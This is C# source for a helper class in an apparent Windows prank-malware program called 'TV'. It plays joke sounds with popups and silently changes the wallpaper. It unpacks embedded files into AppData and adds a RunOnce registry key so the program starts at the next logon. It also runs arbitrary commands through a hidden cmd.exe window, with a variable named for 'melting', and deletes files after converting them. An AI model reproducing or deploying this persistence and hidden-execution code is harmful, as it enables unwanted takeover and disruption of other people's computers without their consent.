using System;
using WMPLib;
using System.IO;
using System.Drawing;
using Microsoft.Win32;
using System.Threading;
using System.Reflection;
using System.Diagnostics;
using System.IO.Compression;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;

namespace TV
{
    class TVMethods
    {
        // Sap class
        public static class Sap
        {
            // Declare new instances
            public static WindowsMediaPlayer Wplayer = new WindowsMediaPlayer();

            // NyanCat song method
            public static void NyanCat()
            {
                // Play sound
                Wplayer.URL = "NyanCat.mp3";
                Wplayer.controls.play();

                // automaticly dispose
                using (NyanCatPopup NyanCatPopup = new NyanCatPopup())
                {
                    try
                    {
                        // Display popup 
                        NyanCatPopup.Show();
                        Thread.Sleep(6500);
                        NyanCatPopup.Hide();
                    }
                    catch
                    {

                    }
                }
            }

            // RickRoll method
            public static void RickRoll()
            {
                // Play sound
                Wplayer.URL = "RickRoll.mp3";
                Wplayer.controls.play();

                // automaticly dispose
                using (RickRollPopup RickRollPopup = new RickRollPopup())
                {
                    try
                    {
                        // Display popup 
                        RickRollPopup.Show();
                        Thread.Sleep(15000);
                        RickRollPopup.Hide();
                    }
                    catch
                    {

                    }
                }
            }

            // SmokeWeedEveryDay method
            public static void SmokeWeedEveryDay()
            {
                // Play sound
                Wplayer.URL = "SmokeWeedEveryDay.mp3";
                Wplayer.controls.play();

                // automaticly dispose
                using (SmokeWeedEveryDayPopup SmokeWeedEveryDayPopup = new SmokeWeedEveryDayPopup())
                {
                    try
                    {
                        // Display popup 
                        SmokeWeedEveryDayPopup.Show();
                        Thread.Sleep(10000);
                        SmokeWeedEveryDayPopup.Hide();
                    }
                    catch
                    {

                    }
                }
            }

            // WinXPEarRape method
            public static void WinXPEarRape()
            {
                // Play sound
                Wplayer.URL = "WindowsXPEarRape.mp3";
                Wplayer.controls.play();

                // automaticly dispose
                using (WinXPEarRapePopup WinXPEarRapePopup = new WinXPEarRapePopup())
                {
                    try
                    {
                        // Display popup 
                        WinXPEarRapePopup.Show();
                        Thread.Sleep(5000);
                        WinXPEarRapePopup.Hide();
                    }
                    catch
                    {

                    }
                }
            }
        }

        // Import dll
        [DllImport("user32.dll", CharSet = CharSet.Auto)]

        // setup the SystemParametersInfo parameters
        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        // Change wallpaper method, NOTE: it has a z at the end so it dosnt mess with the thread naming
        public static void ChangeWallpaperz(string PicName)
        {
            // Create new RegistryKey instance 
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);

            // Set the keys
            key.SetValue(@"WallpaperStyle", 2.ToString());
            key.SetValue(@"TileWallpaper", 0.ToString());

            // Set wallpaper
            SystemParametersInfo(20, 0, Directory.GetCurrentDirectory() + @"\" + PicName, 0x01 | 0x02);
        }

        // Extract & unzip file from resources method
        public static void Extract(string NameSpace, string OutDirectory, string InternalFilePath, string ResourceName)
        {
            // Declar new instance of assembly
            Assembly assembly = Assembly.GetCallingAssembly();

            // Declar new instance of stream
            using (Stream s = assembly.GetManifestResourceStream(NameSpace + "." + (InternalFilePath == "" ? "" : InternalFilePath + ".") + ResourceName))
            {
                // Declar new instance of binaryreader
                using (BinaryReader r = new BinaryReader(s))
                {
                    // Declar new instance of filestream
                    using (FileStream fs = new FileStream(OutDirectory + @"\" + ResourceName, FileMode.OpenOrCreate))
                    {
                        // Declar new instance of binarywriter
                        using (BinaryWriter w = new BinaryWriter(fs))
                        {
                            // Read bytes, write file
                            w.Write(r.ReadBytes((int)s.Length));
                        }
                    }
                }
            }

            // Unzip file, declare new instance
            using (ZipArchive archive = ZipFile.OpenRead(Program.Appdata + @"\TV\" + ResourceName))
            {
                // Loop though files
                foreach (ZipArchiveEntry entry in archive.Entries)
                {
                    // Unzip
                    entry.ExtractToFile(Path.Combine(Program.Appdata + @"\TV", entry.FullName));
                }
            }

            // Delete zip file
            File.Delete(Program.Appdata + @"\TV\" + ResourceName);
        }

        // Add/remove startup key method
        public static void StartupKey(string AddOrRemove)
        {
            // Open the runonce registry folder
            using (RegistryKey AddKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", true))
            {
                // If choose equals true, add startup key, if not, remove it
                if (AddOrRemove == "Add")
                {
                    // Add key
                    AddKey.SetValue("TV", Program.Appdata + @"\TV\TV.exe");
                }
                else
                {
                    // Delete Key
                    AddKey.DeleteValue("TV");
                }
            }
        }

        // Run cmd command method
        public static void Cmd(string Command)
        {
            // Declare new instance
            var CmdCommand = new Process();

            // Set start info
            ProcessStartInfo startInfoMelt = new ProcessStartInfo()
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                FileName = "cmd.exe",
                Arguments = @"/C " + Command
            };
            CmdCommand.StartInfo = startInfoMelt;

            // Start cmd with arguments
            CmdCommand.Start();
        }

        // Generate random number method
        public static int Random(int StartRange, int EndRange)
        {
            var Rand = new Random();
            return Rand.Next(StartRange, EndRange + 1);
        }

        // Convert to bmp method
        public static void ConvertToBmp(string FileName)
        {
            // Declair new instance
            Image Img = Image.FromFile(FileName);

            // Remove file extention
            string input = FileName;
            int index = input.IndexOf(".");
            if (index > 0)
            {
                input = input.Substring(0, index);
            }

            // Convert file to bmp
            Img.Save(input + ".bmp", ImageFormat.Bmp);

            // Dispose
            Img.Dispose();

            // Delete file
            File.Delete(FileName);
        }
    }
}
